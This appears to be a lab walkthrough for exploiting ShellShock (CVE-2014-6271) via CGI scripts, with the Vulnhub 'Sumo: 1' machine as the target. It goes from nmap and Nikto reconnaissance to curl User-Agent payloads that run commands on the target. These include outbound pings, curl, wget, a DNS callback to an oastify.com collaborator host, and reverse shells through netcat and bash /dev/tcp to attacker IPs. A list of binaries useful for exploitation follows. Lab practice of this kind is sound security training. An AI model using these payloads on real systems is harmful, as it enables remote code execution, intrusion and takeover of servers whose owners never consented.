

---

# 🛠️ **Shellshock Vulnerability Exploitation - CGI-Bin** 🧑‍💻

This document explains how to exploit the **ShellShock vulnerability (CVE-2014-6271)** via CGI-bin scripts. The vulnerability arises due to improper handling of environment variables by **Bash**, which allows remote code execution when exploited.

---

## 📍 **Sumo: 1** 🖥️

[Sumo: 1 Vulnhub](https://www.vulnhub.com/entry/sumo-1,480/)

### **Setup and Reconnaissance** 🔍

### 🔎 **Scanning for Open Ports and Services** 📡

Start by scanning the target with **nmap** to identify open ports and services running on the machine:

```bash
nmap -v -p 80 -sT -sV -A 192.168.1.204
```

This command performs a basic scan on port 80 and attempts service version detection.

### 🛠️ **Aggressive Scan and HTTP Enumeration**

Use nmap with the **http-enum** script to gather more detailed information on the target web server:

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.1.204
```

This command runs an aggressive scan and uses the **http-enum** script to identify potential **CGI** directories.

### 🚨 **Nikto Web Scanner**

Run **Nikto**, a web vulnerability scanner, to identify common issues and **CGI** directories:

```bash
nikto -C all -h http://192.168.1.5/
```

This checks for vulnerabilities across the target HTTP service on port 80.

---

### **Initial Test for ShellShock** 🐚

Test the vulnerability by injecting a command into the **User-Agent** header using **curl**:

```bash
GET /cgi-bin/test/test.cgi HTTP/1.1
Host: 192.168.1.201
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Response should be:

```text
HTTP/1.1 200 OK
Date: Wed, 30 Apr 2025 11:00:22 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 14
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

CGI Default !
```

Test for ShellShock vulnerability:

```bash
curl -H "User-Agent: () { :; }; /bin/ping 192.168.1.6 -c 3" http://192.168.1.201/cgi-bin/test/test.cgi
```

This sends a payload that attempts to ping **192.168.1.6** from the vulnerable target machine.

### **Advanced ShellShock Exploitation with Nmap** 🔐

Use **nmap's ShellShock** script to test for this vulnerability on specific scripts or paths. You can also customize the payload with the `--script-args` option.

Testing **/cgi-bin/test.sh**:

```bash
nmap -v -p 80 --script=http-shellshock.nse --script-args uri=/cgi-bin/test.sh 192.168.1.201
```

Testing **/cgi-bin/admin.cgi**:

```bash
nmap -v -p 80 --script=http-shellshock.nse --script-args uri=/cgi-bin/admin.cgi 192.168.1.201
```

Running **Arbitrary Commands** (e.g., `ls`):

```bash
nmap -v -p 80 --script=http-shellshock.nse --script-args uri=/cgi-bin/test/test.cgi,cmd=ls 192.168.1.201
```

This runs the `ls` command to list the contents of the directory.

---

### **Network Monitoring** 📡

Use **tcpdump** to monitor traffic when executing ShellShock payloads. This can help confirm successful command execution or outbound network activity.

#### **Monitoring ICMP Traffic**:

```bash
tcpdump -n -i eth0 icmp
```

#### **Monitoring UDP Traffic on Port 53**:

```bash
tcpdump -n -i eth0 udp port 53
```

---

### **More Payload Examples** 🎯

* **Simple Ping Command** 🖱️

  ```bash
  curl -H "User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.1.6'" http://192.168.1.201/cgi-bin/test/test.cgi
  ```

* **Sending HTTP Request to Another Host** 🌐

  ```bash
  curl -H "User-Agent: () { :; }; /usr/bin/curl http://192.168.1.7" http://192.168.1.205/cgi-bin/test/test.cgi
  ```

* **DNS Request (for Outbound Connection)** 🔎

  ```bash
  curl -H "User-Agent: () { :; }; /usr/bin/dig 2eh9khiijmskivrozluqdqdqvhlapz.oastify.com @8.8.8.8" http://192.168.1.205/cgi-bin/test/test.cgi --proxy http://127.0.0.1:8080
  ```

* **WGET Command to Download Files** 💻

  ```bash
  curl -H "User-Agent: () { :; }; /bin/bash -c 'wget http://192.168.1.6'" http://192.168.1.201/cgi-bin/test/test.cgi
  ```

---

### **Reverse Shell Commands** 🐚💥

If you gain remote code execution, you can attempt to spawn a **reverse shell**.

* **Reverse Shell via Netcat** 🌐

  ```bash
  curl -H "User-Agent: () { :; }; /bin/bash -c 'nc 192.168.1.6 80'" http://192.168.1.201/cgi-bin/test/test.cgi
  ```

* **Reverse Shell via Bash** 💥

  ```bash
  curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/192.168.1.7/443 0>&1" http://192.168.1.201/cgi-bin/test/test.cgi
  ```

---

### **Important Binaries for Exploitation** 🔑

The following binaries may be useful for exploitation if they are present on the vulnerable target:

* `/usr/bin/ping`
* `/usr/bin/wget`
* `/usr/bin/curl`
* `/usr/bin/nc`
* `/usr/bin/python`
* `/usr/bin/php`
* `/usr/bin/delv`
* `/usr/bin/dig`
* `/usr/bin/host`
* `/usr/bin/mdig`
* `/usr/bin/nslookup`
* `/usr/bin/nsupdate`

---

## **Conclusion** ✅

The **ShellShock vulnerability (CVE-2014-6271)** is a serious issue in which attackers can inject arbitrary commands into the **Bash** environment by manipulating HTTP headers, like **User-Agent**. Using tools like **nmap**, **curl**, and **tcpdump**, attackers can exploit this vulnerability to gain remote code execution or perform additional reconnaissance.

---


